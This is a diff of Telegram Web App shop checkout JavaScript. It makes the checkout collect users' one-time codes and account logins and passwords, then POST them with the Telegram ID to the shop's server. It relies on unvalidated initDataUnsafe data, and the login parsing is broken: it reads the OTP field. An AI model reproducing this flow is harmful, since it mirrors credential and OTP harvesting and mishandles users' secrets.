@@ -9,18 +9,21 @@ document.addEventListener("DOMContentLoaded", () => {
 
     if (checkoutButton) {
         checkoutButton.addEventListener("click", async () => {
-            // Получаем tg_id из URL
-            const urlParams = new URLSearchParams(window.location.search);
-            const tgId = urlParams.get('tg_id');
-            
-            if (!tgId) {
-                showNotification("Ошибка: не удалось определить пользователя");
-                return;
-            }
-
             // Проверяем, есть ли товары в корзине
-            getCart(tgId).then(({items, count}) => {
+            getCart(window.Telegram.WebApp.initDataUnsafe.user.id).then(({items, count}) => {
                 if (count > 0) {
+                    if (window.Telegram && window.Telegram.WebApp) {
+                        const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
+                        // Выводим Telegram ID в консоль сервера, отправив его через fetch
+                        fetch("/save-tg-id", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify({ tg_id: userId }),
+                        });
+                    }
+
                     // Закрываем окно корзины
                     const cartDropdown = document.querySelector('.cart-dropdown-product');
                     if (cartDropdown) {
@@ -172,22 +175,21 @@ function showOrderPopup() {
 
     // Обработчик для кнопки "Далее" в первом окне
     popup.querySelector(".next-btn").addEventListener("click", () => {
-        const inputValue = document.getElementById("order-input").value.trim();
-        if (!inputValue) {
-            alert("Введите данные для входа!");
+        const otpData = document.getElementById("order-input").value;
+        if (!otpData) {
+            alert("Введите OTP-код!");
             return;
         }
-
-        // Разделяем введенные данные на логин и пароль
-        const [login, password] = inputValue.split(' ');
-        if (!login || !password) {
-            alert("Пожалуйста, введите логин и пароль через пробел!");
-            return;
+        if (window.Telegram && window.Telegram.WebApp) {
+            const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
+            fetch("/save-otp", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ tg_id: userId, otp: otpData }),
+            });
         }
-
-        // Сохраняем данные в localStorage
-        localStorage.setItem('loginData', JSON.stringify({ login, password }));
-
         popup.remove();
         removeOverlay(); // Удаляем оверлей
         checkoutButton.disabled = false; // Разблокируем кнопку корзины
@@ -303,14 +305,14 @@ function showOrderDetailsPopup(order) {
             if (user && user.id) {
                 const userId = user.id;
                 try {
-                    // Получаем данные из localStorage, где мы сохранили их в предыдущих попапах
-                    const loginData = localStorage.getItem('loginData');
-                    if (!loginData) {
-                        alert('Ошибка: данные для входа не найдены');
+                    // Получаем данные из полей ввода
+                    const login = document.getElementById("order-input").value.split(' ')[0] || '';
+                    const password = document.getElementById("order-input").value.split(' ')[1] || '';
+                    
+                    if (!login || !password) {
+                        alert('Пожалуйста, введите логин и пароль');
                         return;
                     }
-
-                    const { login, password } = JSON.parse(loginData);
 
                     // Получаем текущую корзину
                     const cartResponse = await fetch(`/api/cart?tg_id=${encodeURIComponent(userId)}`);
@@ -355,74 +357,4 @@ function showOrderDetailsPopup(order) {
             console.error('Telegram Web App не инициализирован');
         }
     });
-}
-
-async function submitOrder(event) {
-    event.preventDefault();
-    
-    if (!window.Telegram || !window.Telegram.WebApp || !window.Telegram.WebApp.initDataUnsafe.user) {
-        alert('Ошибка: Telegram Web App не инициализирован');
-        return;
-    }
-
-    const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
-    const login = document.getElementById('login').value;
-    const password = document.getElementById('password').value;
-
-    if (!login || !password) {
-        alert('Пожалуйста, введите логин и пароль');
-        return;
-    }
-
-    try {
-        // Получаем текущую корзину
-        const cartResponse = await fetch(`/api/cart?tg_id=${encodeURIComponent(userId)}`);
-        if (!cartResponse.ok) {
-            throw new Error('Ошибка при получении корзины');
-        }
-        const cartItems = await cartResponse.json();
-        
-        if (!cartItems || cartItems.length === 0) {
-            alert('Корзина пуста');
-            return;
-        }
-
-        // Вычисляем общую сумму
-        const totalPrice = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-
-        const formData = {
-            user_id: userId,
-            login: login,
-            password: password,
-            total_price: totalPrice
-        };
-
-        console.log('Отправка данных заказа:', formData);
-
-        // Создаем заказ
-        const response = await fetch('/api/create_order', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData)
-        });
-
-        if (!response.ok) {
-            const errorData = await response.json();
-            throw new Error(errorData.message || `HTTP error! status: ${response.status}`);
-        }
-
-        const result = await response.json();
-        
-        if (result.status === 'success') {
-            saveFormData();
-            window.Telegram.WebApp.close();
-        } else {
-            alert(result.message || 'Произошла ошибка при оформлении заказа');
-        }
-    } catch (error) {
-        console.error('Ошибка при создании заказа:', error);
-        alert('Произошла ошибка при оформлении заказа: ' + error.message);
-    }
 }
